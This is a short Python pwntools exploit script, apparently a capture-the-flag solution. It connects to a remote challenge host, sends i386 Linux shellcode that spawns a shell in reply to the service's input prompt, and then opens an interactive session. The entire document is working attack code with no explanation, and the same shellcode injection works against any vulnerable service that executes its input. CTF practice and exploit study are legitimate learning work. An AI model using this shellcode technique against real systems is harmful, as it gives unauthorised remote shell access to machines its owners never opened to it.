from pwn import *

io = remote('node4.buuoj.cn', 25725)

payload = asm(shellcraft.i386.linux.sh())
io.sendlineafter(b'Enter a string!\n', payload)
io.interactive()